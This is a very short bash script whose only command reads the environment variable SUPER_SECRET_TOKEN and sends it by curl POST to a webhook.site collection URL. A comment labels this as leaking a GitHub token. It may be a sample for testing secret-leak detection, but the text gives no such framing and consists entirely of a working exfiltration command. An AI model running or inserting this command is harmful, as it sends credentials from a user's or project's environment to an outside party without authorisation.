#!/bin/bash

# Sending a POST request with a GitHub token (LEAK)
curl -X POST -d "secret=$(printenv SUPER_SECRET_TOKEN)" https://webhook.site/23fc6851-8ac9-444a-8d9b-e82e0a517898
